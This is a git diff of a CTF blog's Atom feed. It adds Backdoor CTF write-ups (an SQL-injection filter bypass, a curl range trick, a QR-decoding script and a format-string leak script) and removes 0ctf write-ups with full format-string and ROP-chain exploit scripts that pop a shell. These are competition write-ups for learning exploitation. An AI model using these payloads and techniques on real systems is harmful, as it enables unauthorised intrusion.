@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-03-31T07:19:17+02:00</updated>
+  <updated>2015-04-02T20:17:02+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -12,6 +12,305 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Backdoor CTF - Judge]]></title>
+    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge/"/>
+    <updated>2015-04-02T20:10:52+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge</id>
+    <content type="html"><![CDATA[<p>A web challenge! For 100 points, we we&rsquo;re asked to log in as <code>admin</code>.</p>
+
+<!-- more -->
+
+
+<p>Pointing a browser to the challenge site gave us the option to login, or register. I decided to register <code>testz0r:testz0r</code> and logged in. The login then asked me to login as admin. Well, I had no password for admin. I went back to the register page, thinking there was a SQLi there. That might allow me to inject into the INSERT INTO statement and update the admin&rsquo;s password. Alas, no dice.</p>
+
+<p>I again fired up <code>curl</code> and tried to get some SQLi going on the login form.</p>
+
+<pre><code class="bash">curl http://hack.bckdr.in/JUDGE/index.php --data "username=testz0r' or 'a'='a&amp;password=testz0r"
+&lt;!DOCTYPE html&gt;
+
+&lt;html&gt;
+
+&lt;head&gt;
+&lt;title&gt;Login&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+An Error occured
+</code></pre>
+
+<p>After messing around for a while, I remembered that sometimes, keywords like <code>OR</code> and <code>AND</code> are filtered. I tried to substitute <code>OR</code> for <code>||</code> and whadda-ya-know:</p>
+
+<pre><code class="bash">$ curl http://hack.bckdr.in/JUDGE/index.php --data "username=admin'||'1&amp;password=testz0r"
+&lt;!DOCTYPE html&gt;
+
+&lt;html&gt;
+
+&lt;head&gt;
+&lt;title&gt;Login&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+Flag is [REDACTED]
+</code></pre>
+
+<p>Done! One filter bypass was all it took.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Backdoor CTF - LHC]]></title>
+    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-lhc/"/>
+    <updated>2015-04-02T19:59:55+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-lhc</id>
+    <content type="html"><![CDATA[<p><code>LHC</code> was a short &amp; sweet challenge in Backdoor CTF. It had a nice &lsquo;aha-Erlebnis&rsquo; moment.</p>
+
+<!-- more -->
+
+
+<p>During the CTF, the organizers dropped this challenge. The description mentioned that the flag was hidden in a data file. This data file was kindly provided by the Large Hadron Collider and was 2049 GB large.</p>
+
+<p>I&rsquo;ll let that sink in.</p>
+
+<p>Two-thousand and forty nine <strong>gigabytes</strong>. Downloading it would take more than twenty days. The flag was in the middle of the file, but that still meant downloading more than a terabyte of data.</p>
+
+<p>I fired up <code>curl</code> and looked at the download:</p>
+
+<pre><code>bas@tritonal:~/tmp/bckdr/medusa$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt &gt; /dev/null
+* About to connect() to lhc-cdn.herokuapp.com port 443 (#0)
+*   Trying 107.21.223.88...
+...snip...
+&gt; GET /data.txt HTTP/1.1
+&gt; User-Agent: curl/7.26.0
+&gt; Host: lhc-cdn.herokuapp.com
+&gt; Accept: */*
+&gt; 
+* additional stuff not fine transfer.c:1037: 0 0
+* HTTP 1.1 or later with persistent connection, pipelining supported
+&lt; HTTP/1.1 200 OK
+&lt; Server: Cowboy
+&lt; Connection: keep-alive
+&lt; X-Powered-By: Express
+&lt; Accept-Ranges: bytes
+&lt; Content-Type: text/plain; charset=utf-8
+&lt; Content-Length: 2200000000000
+&lt; Date: Wed, 01 Apr 2015 21:44:48 GMT
+&lt; Via: 1.1 vegur
+</code></pre>
+
+<p>Yup, 2200000000000 bytes of data. But wait! <code>curl</code> has the option to resume a broken download; that meant that I could control where the download would start. I issued this command and started searching the output for the flag:</p>
+
+<pre><code class="bash">$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt -C 1100000000000 &gt; lhc-middle
+...snip...
+$ strings -n 20 ./lhc-middle
+</code></pre>
+
+<p>This gave me part of the flag; the description said it was in the middle of the datafile, so I subtracted another 1000 bytes:</p>
+
+<pre><code>$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt -C 1099999998999 &gt; lhc-middle
+$ strings lhc-middle -n 20
+              The flag is: [REDACTED]
+</code></pre>
+
+<p>Simple, really, once you know the trick.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Backdoor CTF - QR]]></title>
+    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr/"/>
+    <updated>2015-04-02T19:43:08+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr</id>
+    <content type="html"><![CDATA[<p>For this challenge, we had to decode a ton of QR images given to us via a <code>nc</code> connection for 70 points. Sounds like fun!</p>
+
+<!-- more -->
+
+
+<p>Upon connecting to the service, it tells us we need to decode as much flags as we can. We also get the first flag.</p>
+
+<p><img src="/assets/bckdr/qr-00.png" alt="" />
+Right, so I turned to the solution to <a href="https://ctf-team.vulnhub.com/advent-ctf-2014-qr-garden/">QR Garden by Swappage</a>. I liked his approach and decided to do something similar. I installed <code>zbar</code> on my box and cobbled together a python script. That script would connect to the QR service, write out the QR code to disk using <code>PIL</code> and then call <code>zbarimg</code> to decode the QR code. I had some issues at the start because I mixed up the colors of the QR code, but then I was decoding them all pretty rapidly.</p>
+
+<pre><code class="python">from socket import *
+from PIL import Image
+from os import popen
+import re, time, telnetlib
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+        buf += s.recv(1)
+    return buf
+
+def sendln(b):
+    s.send(b + b'\n')
+
+def getQR(qr):
+    im = Image.new("RGB", (94, 94), 'white')
+
+    pixels = im.load()
+    print len(qr)
+    y = 0
+    x = 0
+    i = 0
+    while i &lt; len(qr):
+        if ord(qr[i]) == 0xe2:
+            pixels[x,y] = (0, 0, 0)
+            pixels[x,y+1] = (0, 0, 0)
+            x += 1
+        if ord(qr[i]) == 0x20:
+            pixels[x,y] = (255, 255, 255)
+            pixels[x,y+1] = (255, 255, 255)
+            x += 1
+        if ord(qr[i]) == 0xa:
+            x = 0
+            y += 2
+        i += 1
+
+    # write out QR to disk  
+    im.save('qr.png')
+
+    # ugly hack because ctf
+    popen('zbarimg ./qr.png &gt; qr.out')
+
+    with open('qr.out') as f:
+        data = f.readline()
+        f.close()
+
+    m = re.findall(r'Code:([0-9a-f]*)', data)
+    return m[0]
+
+def pwn():
+    global s
+    s = socket(AF_INET, SOCK_STREAM)
+    s.connect(("hack.bckdr.in", 8010))
+
+    readtil('can') # banner
+
+    try:
+        while 1:
+            time.sleep(0.05)
+            qr = readtil(b'\x0a                                          ')
+            #print qr
+            sendln(getQR(qr))
+            response = s.recv(200)
+            print response
+    except KeyboardInterrupt:
+        t = telnetlib.Telnet()
+        t.sock = s
+        t.interact()
+        s.close()
+
+pwn()
+</code></pre>
+
+<p>The script was receiving and decoding QR codes quite rapidly, but I didn&rsquo;t receive any flags. I finally just fired up <code>wireshark</code> to grab the flag from the TCP stream:</p>
+
+<p><img src="/assets/bckdr/qr-01.png" alt="" /></p>
+
+<p>Not the most elegant way to grab the flag, but hey, it worked.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Backdoor CTF - Team]]></title>
+    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team/"/>
+    <updated>2015-04-02T19:23:27+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team</id>
+    <content type="html"><![CDATA[<p>Backdoor CTF was hosted on a weekday, so we only had the evening to grab as many flags as we could. Here&rsquo;s how we solved <code>team</code> for 600 points.</p>
+
+<!-- more -->
+
+
+<p>The binary we&rsquo;ve been given is a 32-bit ELF. The output of strings doesn&rsquo;t give us much. Using <code>strace ./team</code>, it becomes clear that the binary reads from <code>flag.txt</code> so I created one locally. I echoed <code>flag1</code> to the file and restarted the binary.</p>
+
+<p>It asks for a team name and a flag. After receiving these values in heap buffers (non-overflowable as far as I could gather) it proceeds to read the flag from <code>flag.txt</code>. Then, it compares the user input to the flag using <code>strcmp</code>.</p>
+
+<p>The team name is then printed using <code>printf</code>: this is vulnerable to a format string vulnerability:</p>
+
+<pre><code>bas@tritonal:~/tmp/bckdr/team-600$ ./team
+Enter teamname: TEAM%llp
+Enter flag: FLAG%llp
+TEAM0x64 : incorrect flag. Try again.
+</code></pre>
+
+<p>Okay, so let&rsquo;s have a look at the stack when we reach <code>printf</code>. It gets called at <code>8048711</code> to print the team name.</p>
+
+<pre><code>Breakpoint 1, 0x08048711 in ?? ()
+gdb-peda$ x/40wx $esp
+0xffffd510: 0x0804b008  0x00000064  0x0804b140  0x00000000
+0xffffd520: 0x00000000  0x00000000  0x0804b0d8  0x0804b008
+0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
+0xffffd540: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd550: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd560: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd570: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd580: 0x00000000  0x00000000  0x00000000  0x00000000
+0xffffd590: 0x00000000  0x00000002  0x00000000  0x856b7a00
+0xffffd5a0: 0x00000000  0x00000000  0xffffd5d8  0x0804880c
+</code></pre>
+
+<p>What&rsquo;s this then? From breakpointing <code>strcmp</code>, I learned that the flag was on the stack. In fact, it&rsquo;s within reach of the format string vulnerability!</p>
+
+<pre><code>0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
+                          flag1 &gt;&gt;&gt;   g a l f           1
+</code></pre>
+
+<p>That&rsquo;s too easy, right? Wrong! The flag starts at <code>%10$p</code>:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/bckdr/team-600$ ./team
+Enter teamname: %10$p
+Enter flag: bleh
+0x67616c66 : incorrect flag. Try again.
+</code></pre>
+
+<p>It worked remotely with this script:</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib, re, sys
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+        buf += s.recv(1)
+    return buf
+
+def sendln(b):
+    s.send(b + b'\n')
+
+def sendbin(b):
+    s.sendall(b)
+
+def p(x):
+    return struct.pack('&lt;L', x &amp; 0xffffffff)
+
+def pwn(n):
+    global s
+    s=socket(AF_INET, SOCK_STREAM)
+    s.connect(('hack.bckdr.in', 8004))
+
+    readtil('teamname: ')
+    sendln("AAAA%"+str(n)+"$p")
+    readtil('flag: ')
+    sendln("CTF_TEAM_VULNHUB")
+    data = readtil('again.')
+
+    s.close()
+    m = re.findall(r'0x([0-9a-f]*) :', data)
+    return m[0]
+
+full = ''
+for i in xrange(10, 30):
+    full += pwn(i).decode('hex')[::-1]
+    print full
+</code></pre>
+
+<p>This spits out the flag until it hits something it can&rsquo;t hex decode. Because the CTF is long-lived, we won&rsquo;t post any flags.</p>
+
+<p>Far too easy for a 600 point challenge, but we&rsquo;re not complaining&hellip;</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[0ctf - R0ops]]></title>
@@ -280,1314 +579,6 @@ FLAG IS: 0ctf{c97155a5e288fa45f926b1058e4e0385d6ccde8513002885dc67948524bcbc85}
 </code></pre>
 
 <p>Good stuff! Funny to see a ROP chain &ldquo;from the other side&rdquo; :)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[0ctf - Login]]></title>
-    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-login/"/>
-    <updated>2015-03-30T20:17:23+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-login</id>
-    <content type="html"><![CDATA[<p>The second pwnable I solved for <code>0ctf</code> on behalf of CTF-Team VulnHub! This one contained My Favorite Vulnerability, guess which one?</p>
-
-<!-- more -->
-
-
-<p><code>login</code> was a 64-bit ELF. Quickly checking what I was up against with <code>gdb-peda</code>:</p>
-
-<pre><code class="bash">gdb-peda$ checksec
-CANARY    : ENABLED
-FORTIFY   : disabled
-NX        : ENABLED
-PIE       : ENABLED
-RELRO     : FULL
-</code></pre>
-
-<p>Oops. This looks like fun! The description said to login as guest, and login as root. Together with the output of <code>strings</code>, this allowed me to bypass the first login:</p>
-
-<pre><code class="bash">Login: guest
-Password: guest123
-== 0CTF Login System ==
-1. Show Profile
-2. Login as User
-3. Logout
-=======================
-Your choice: 1
-Username: guest
-Level: Guest
-</code></pre>
-
-<p>Now, we&rsquo;re presented with three choices. With <code>2</code>, we can change our username and view it with <code>1</code>. However, this was not vulnerable to overflows or format string vulnerabilities. I dug into the menu system, looking for hidden things, and indeed:</p>
-
-<pre><code>;;; print_menu and get_choice
-1265: call   ddd &lt;open@plt+0x24d&gt;   
-126a: mov    DWORD PTR [rbp-0x4],eax
-126d: mov    eax,DWORD PTR [rbp-0x4]
-1270: cmp    eax,0x2
-1273: je     1299 &lt;open@plt+0x709&gt;
-1275: cmp    eax,0x2
-1278: jg     1281 &lt;open@plt+0x6f1&gt;
-127a: cmp    eax,0x1
-127d: je     128d &lt;open@plt+0x6fd&gt;
-127f: jmp    12e3 &lt;open@plt+0x753&gt;
-1281: cmp    eax,0x3
-1284: je     12a5 &lt;open@plt+0x715&gt;
-1286: cmp    eax,0x4                ; AHA! Secret entry
-1289: je     12b8 &lt;open@plt+0x728&gt;  ; Jump to 12b8
-128b: jmp    12e3 &lt;open@plt+0x753&gt;
-128d: mov    eax,0x0
-1292: call   f24 &lt;open@plt+0x394&gt;
-1297: jmp    12f0 &lt;open@plt+0x760&gt;
-1299: mov    eax,0x0
-129e: call   f7a &lt;open@plt+0x3ea&gt;
-12a3: jmp    12f0 &lt;open@plt+0x760&gt;
-12a5: lea    rdi,[rip+0x246]        # 14f2 &lt;open@plt+0x962&gt;
-12ac: call   a90 &lt;puts@plt&gt;
-12b1: mov    eax,0x0
-12b6: jmp    12f5 &lt;open@plt+0x765&gt;
-
-;;; choice 4
-12b8: lea    rax,[rip+0x200d81]     ; rax points to our provided username (e.g. 'root')
-12bf: mov    eax,DWORD PTR [rax+0x100]  ; check this flag... starts off as 0x1
-12c5: test   eax,eax
-12c7: jne    12d5 &lt;open@plt+0x745&gt;
-</code></pre>
-
-<p>So we need to bypass this secret menu and make sure that the flag is set to <code>0x00</code>. As I said, <code>rax</code> points to our input, and the flag comes 256 bytes after that. It starts out as 1 and we need to make it zero&hellip; we&rsquo;re looking for an off-by-one! This is present in the <code>input username</code> function, allowing the reset of the flag and entering the secret login menu:</p>
-
-<pre><code>Login: guest
-Password: guest123
-== 0CTF Login System ==
-1. Show Profile
-2. Login as User
-3. Logout
-=======================
-Your choice: 2
-Enter your new username:
-HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
-Done.
-== 0CTF Login System ==
-1. Show Profile
-2. Login as User
-3. Logout
-=======================
-Your choice: 4
-Login: root
-Password: toor
-root login failed.
-1 chance remaining.
-Login: %llp
-Password: bleh
-0x7f13e2689490 login failed.
-Threat detected. System shutdown.
-</code></pre>
-
-<p>I won&rsquo;t show the disassembly, but just describe what happens. Locally, the binary takes the md5 of our supplied password, but compares it to <code>0ops{secret_md5}</code>. If it matches, it calls a function to dump the flag. I figured the remote binary would contain the real md5, so I needed a way to read from the process remotely. The vulnerability to do so was found soon enough, it&rsquo;s a format string vulnerability. We get two chances. I used the first to leak a stack address and an address of the binary (because of PIE, it&rsquo;s loaded at a different address each time). The second printf call is then used to leak the md5 to which our supplied password is compared.</p>
-
-<p>Easy, right? Wrong. The remote binary returned the same string, <code>0ops{secret_md5}</code>. Obviously, I had to find another way to break this binary.</p>
-
-<h2>The Nitty Gritty</h2>
-
-<p>I tried overwriting a GOT pointer with the format string vulnerability, but failed: the GOT section was marked read-only! I looked for other ways to gain control of execution or making the <code>memcmp</code> succeed, but could only come up with one thing: overwriting the saved return address of the second printf call.</p>
-
-<pre><code>11d9: lea    rsi,[rip+0x2b5]       ; 'secret_MD5' --&gt; same remotely :?
-11e0: mov    rdi,rax
-11e3: call   b70 &lt;memcmp@plt&gt;
-11e8: test   eax,eax
-11ea: jne    11f8 &lt;open@plt+0x668&gt;
-11ec: mov    eax,0x0
-11f1: call   fb3 &lt;open@plt+0x423&gt;
-11f6: jmp    122e &lt;open@plt+0x69e&gt;
-11f8: lea    rax,[rbp-0x210]
-11ff: mov    rdi,rax
-1202: mov    eax,0x0
-1207: call   a70 &lt;printf@plt&gt;      ; second printf call; overwrite saved ret addr using format string vuln
-120c: lea    rdi,[rip+0x293]        # 14a6 &lt;open@plt+0x916&gt;
-1213: call   a90 &lt;puts@plt&gt;
-1218: lea    rdi,[rip+0x2b1]        # 14d0 &lt;open@plt+0x940&gt;
-121f: call   a90 &lt;puts@plt&gt;
-1224: mov    edi,0x1
-1229: call   aa0 &lt;exit@plt&gt;
-</code></pre>
-
-<p>I found a nice, stable stack pointer that I could leak, calculated the offset to the location of the saved return address and plugged it in a poc script. Locally, it gave me the flag! I quickly tried it remotely, but it failed miserably. Turns out the layout of the stack was different; the leaked stack pointer was at a different location. Furthermore, the offset from other leaked stack addresses to the saved return address of the second printf was different. Back to the drawing board?</p>
-
-<h2>Some luck involved</h2>
-
-<p>I spent some time trying to locate other stack addresses that I could leak and gave me a nice, stable way to calculate the location of the saved return address. I had a way to leak the binary address, meaning I could calculate the exact return address. I then started brute-forcing stack pointers and using the second printf to dump the memory from the stack. Using this, I was looking for the correct return address. Because I was fed up with it and it was late, I had forgotten to remove a certain constant from the poc that I used locally.</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib, re, sys
-
-def readtil(delim):
-    buf = b''
-    while not e in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def q(x):
-    return struct.pack('&lt;Q', x)
-
-def pwn():
-    global s
-    s=socket(AF_INET, SOCK_STREAM)
-    #s.connect(('localhost', 6666))
-    s.connect(('202.112.26.107', 10910))
-
-    raw_input()
-
-    readtil('Login: ')
-    sendln('guest')
-    readtil('Password: ')
-    sendln('guest123')
-    readtil('choice: ')
-    sendln('2')
-    readtil('username:')
-    sendln("A"*256)     # overflow userflag
-    readtil('choice: ')
-    sendln('4')         # secret login menu
-
-    ### first format string vuln to read stack addr
-    readtil('Login: ')
-    # leak both binary address and stack address
-    sendln('%1$lp-%'+sys.argv[1]+'$lp')
-    readtil('Password: ')
-    sendln('bleh')
-    data = readtil('login failed.')
-
-    m = re.findall(r'([a-f0-9]{5,})', data)
-    # find stack addr:
-    stack_addr = int(m[1], 16) 
-    base_addr = int(m[0], 16) - 0x1490
-
-    print "[+] Leaked address of base: {}".format(hex(base_addr))
-    print "[+] Leaked address of stack: {}".format(hex(stack_addr))
-
-    readtil('Login: ')
-
-    sendln('AAAAAAABBBC%10$s'+q(stack_addr-504))    # this offset of 504 was found locally and seems to be correct for remote, too
-
-    readtil('Password: ')
-    sendln('bleh')
-    data = s.recv(1000)
-    print data 
-    print hex(struct.unpack('&lt;Q', data[len('AAAAAAABBBC'):len('AAAAAAABBBC')+6]+b"\x00\x00")[0])
-    print "you're looking for {}".format(hex(base_addr + 0x120c))
-
-    # check if the stack location contains the right return address
-    if (struct.unpack('&lt;Q', data[len('AAAAAAABBBC'):len('AAAAAAABBBC')+6]+b"\x00\x00")[0]) == (base_addr + 0x120c):
-        print "Found at {}".format(sys.argv[1])
-        raw_input()
-
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-
-    s.close()
-
-pwn()
-</code></pre>
-
-<p>Note: the exact layout of the format string is chosen such that the stack address is overlapping with an actuall address on the stack. Because we can&rsquo;t send null-bytes, if we overwrite something else, the pointer would be mangled:</p>
-
-<pre><code>before: 0xdeadbeef 0xcafebabe
-after:  0x504ddb66 0x7fff00be -&gt; stack address is invalid, pointing to 0xbe007fff....
-
-should be:
-
-before: 0xdeadbeef 0xcafe0000
-after:  0x504ddb66 0x7fff0000 -&gt; properly set stack address
-</code></pre>
-
-<p>Locally, I identified both the arguments 15 and 41 (in the first format string vuln) to contain the right stack address. Remotely, these contained something different. However, I simply increased the number until I hit 43: this address, combined with the offset, contained the return address! I definitely lucked out after banging my head against the challenge for a few hours.</p>
-
-<h2>Hitting the jackpot</h2>
-
-<pre><code class="bash">$ python poc.py 43
-
-[+] Leaked address of base: 0x7f48589d5000
-[+] Leaked address of stack: 0x7fffb65656b0
-[+] Offset format string with 24497 bytes
-AAAAAAABBBC
-           b.XH..TV...
-0x7f48589d620c
-you're looking for 0x7f48589d620c
-Found at 43
-</code></pre>
-
-<p>Armed with the correct stack address, I could now trivially overwrite two bytes of the saved return address so that it points to the function that read the flag and dumps it over the socket:</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib, re, sys
-
-def readtil(delim):
-    buf = b''
-    while not delim in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def q(x):
-    return struct.pack('&lt;Q', x)
-
-def pwn():
-    global s
-    s=socket(AF_INET, SOCK_STREAM)
-    #s.connect(('localhost', 6666))
-    s.connect(('202.112.26.107', 10910))
-
-    #raw_input()
-
-    readtil('Login: ')
-    sendln('guest')
-    readtil('Password: ')
-    sendln('guest123')
-    readtil('choice: ')
-    sendln('2')
-    readtil('username:')
-    sendln("A"*256)     # overflow userflag
-    readtil('choice: ')
-    sendln('4')         # secret login menu
-
-
-    ### first string format vuln to read stack addr
-    readtil('Login: ')
-    # 43 found by lucky bruteforcing in combination with the 504 below. locally, it's at 15 and 41
-    sendln('%1$lp-%43$lp')
-    readtil('Password: ')
-    sendln('bleh')
-    data = readtil('login failed.')
-
-    m = re.findall(r'([a-f0-9]{5,})', data)
-    # find stack addr:
-    stack_addr = int(m[1], 16) 
-    base_addr = int(m[0], 16) - 0x1490
-
-    # base_addr was not necesssary in the final exploit, but was 
-    # instrumental in finding the right offset!
-    print "[+] Leaked address of base: {}".format(hex(base_addr))
-    print "[+] Leaked address of stack: {}".format(hex(stack_addr))
-
-    readtil('Login: ')
-
-    # we need to return to base_addr + 0xfb3, because that function 
-    # is designed to read the flag &amp; spit it over the socket
-    print_offset = (base_addr &amp; 0xffff) + 0xfb3 - 2
-
-    print "[+] Offset format string with {} bytes".format(print_offset)
-
-    # send format string to overwrite saved return addr of 
-    sendln('%' + "%05d" % print_offset +'c___%10$hn'+q(stack_addr-504)) # should point to ret_addr at stack
-
-    readtil('Password: ')
-    sendln('bleh')
-
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-
-    s.close()
-
-pwn()
-</code></pre>
-
-<p>Yes, it looks horrible, but it did drop the flag, scoring us another 300 points.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[0ctf - Flagen]]></title>
-    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-flagen/"/>
-    <updated>2015-03-30T19:32:07+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-flagen</id>
-    <content type="html"><![CDATA[<p>0ctf sported a number of challenges and I was happy to grab a few flags. Here&rsquo;s how we solved <code>flagen</code>.</p>
-
-<!-- more -->
-
-
-<p><code>flagen</code> is a 32-bit ELF, and we&rsquo;re also given the corresponding <code>libc</code> library. It functions as a flag generator, which can perform various functions on the input:</p>
-
-<pre><code>== 0ops Flag Generator ==
-1. Input Flag
-2. Uppercase
-3. Lowercase
-4. Leetify
-5. Add Prefix
-6. Output Flag
-7. Exit 
-=========================
-</code></pre>
-
-<p>We can input a fixed buffer of 256 bytes and the functions do exactly what they say. The most interesting function is <code>leetify</code>, because this takes the input and transforms it to leet-speak:</p>
-
-<pre><code>== 0ops Flag Generator ==
-1. Input Flag
-2. Uppercase
-3. Lowercase
-4. Leetify
-5. Add Prefix
-6. Output Flag
-7. Exit 
-=========================
-Your choice: 1
-Hello World!
-Done.
-== 0ops Flag Generator ==
-1. Input Flag
-2. Uppercase
-3. Lowercase
-4. Leetify
-5. Add Prefix
-6. Output Flag
-7. Exit 
-=========================
-Your choice: 4
-Done.
-== 0ops Flag Generator ==
-1. Input Flag
-2. Uppercase
-3. Lowercase
-4. Leetify
-5. Add Prefix
-6. Output Flag
-7. Exit 
-=========================
-Your choice: 6
-The Flag is: 1-13110 W0r1d!
-Done.
-</code></pre>
-
-<p>There are several transformations done, but most importantly, the <code>H</code> is translated into <code>1-1</code>. One byte becomes three bytes! I smell a buffer overflow! Indeed, when storing a flag consisting of 256 times <code>H</code> and then asking it to perform <code>leetify</code>, the program generates a segmentation fault.</p>
-
-<h2>Narrowing down</h2>
-
-<p>After disassembling the responsible function, we quickly learn that we overrun a stack buffer. By supplying the correct amount of <code>H</code> bytes, the stack buffer is extend way past the allocated 256 bytes, but the binary has stack smashing protection in place. With no way to leak the canary, it&rsquo;s time to get creative.</p>
-
-<p>The epilogue of the vulnerable function looks like this:</p>
-
-<pre><code>8048ad4: mov    eax,DWORD PTR [ebp+0x8]        ; eax is the destination buffer
-8048ad7: lea    edx,[ebp-0x10c]                ; edx is the source buffer on the stack
-8048add: mov    DWORD PTR [esp+0x4],edx        ; copy stack buffer to dest buffer
-8048ae1: mov    DWORD PTR [esp],eax
-8048ae4: call   80484f0 &lt;strcpy@plt&gt;
-8048ae9: mov    eax,DWORD PTR [ebp-0xc]
-8048aec: xor    eax,DWORD PTR gs:0x14          ; check canary value
-8048af3: je     8048afa &lt;atoi@plt+0x59a&gt;
-8048af5: call   80484e0 &lt;__stack_chk_fail@plt&gt; ; terminate if canary is overwritten
-8048afa: add    esp,0x124
-8048b00: pop    edi
-8048b01: pop    ebp
-8048b02: ret    
-</code></pre>
-
-<p>Because the function takes the pointer to the destination buffer from the stack, we can control it. This means we have a write-what-where. Unfortunately, in the process of doing this, the canary still gets destroyed!. This means that the binary will <em>always</em> call <code>stack_chk_fail</code> and terminate. Luckily, <code>stack_chk_fail</code> is an imported function, which means we can overwrite its GOT entry with the hijacked <code>strcpy</code>! This will lead to control over <code>eip</code>. Just one final hurdle&hellip;</p>
-
-<h2>ROP it likes it&rsquo;s hot</h2>
-
-<p>NX is enabled, so we need to build a ROP chain. First, we need pivot the stack pointer into our ROP chain. I found a nice <code>add esp, 0x1c; pop pop pop pop ret</code> gadget and decided to overwrite <code>stack_chk_fail</code> with that address. This will pivot <code>esp</code> into our ROP chain, ready for the next set of gadgets. The plan is to adjust the GOT pointer of <code>read</code> to make it point to <code>system</code>. Then, write out the string <code>sh;</code> in memory and using that as an argument for <code>system</code>.</p>
-
-<p>To make this happen, I just two more gadgets:</p>
-
-<pre><code class="python"># 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret
-# 0x08048aff : add [edi + 0x5d], bl; ret
-</code></pre>
-
-<p>With the first gadget, I could control the values of various registers, provided there are no bad chars. <code>0x00</code> is obviously bad, but remember, we pass the buffer to <code>leetify</code>: it will mangle chars like <code>H</code> and <code>s</code>! These must also be avoided, which is why the ROP chain builds the characters <code>s</code> and <code>h</code> in two parts in memory.</p>
-
-<p>The second gadget allows me to adjust values. Because <code>libc</code> is given, the output of <code>nm -D ./libc.so.6</code> could be grepped for <code>system</code> and <code>read</code>. By carefully choosing the numbers, I could adjust the GOT pointer for read. I decided to write out <code>sh;</code> into an empty piece of GOT memory. Finally, ret2system via <code>read@plt</code> and pop a shell!</p>
-
-<p>The final exploit:</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib
-
-def readtil(delim):
-    buf = b''
-    while not delim in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def p(x):
-    return struct.pack('&lt;L', x &amp; 0xffffffff)
-
-def pwn():
-    global s
-    s=socket(AF_INET, SOCK_STREAM)
-    #s.connect(('localhost', 6666))
-    s.connect(('202.112.28.115', 5149))
-
-    raw_input()
-
-    readtil('choice: ')
-    sendln('1')     # input flag
-
-    # gadgets 
-    # 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret
-    # 0x08048aff : add [edi + 0x5d], bl; ret
-
-    # start building the ropchain
-    payload = ''
-    # 0x8048d89 : used to overwrite stack_chk_fail@got and pivot the stack into our ROP chain
-    payload += p(0x8048d89) 
-    payload += '0000'*2 # junk
-
-    # from libc.6.so:
-    # 00040190 W system
-    # 000dabd0 W read
-
-    ### first byte
-    payload += p(0x08048d8c)
-    payload += p(0xffffffc0)    # ebx, lower byte is important read -&gt; system (0xd0 + 0xc0 = 0x190)
-    payload += p(-1)            # esi
-    payload += p(0x804b00c-0x5d)        # edi -&gt; read@got
-    payload += p(-1)            # ebp
-    payload += p(0x08048aff)    # 0x08048aff
-    ### second byte
-    payload += p(0x08048d8c)
-    payload += p(0xffffff56)    # ebx, lower byte is important read -&gt; system (0xab + 0x56 = 0x101) 0x56 = V == not leetified
-    payload += p(-1)            # esi
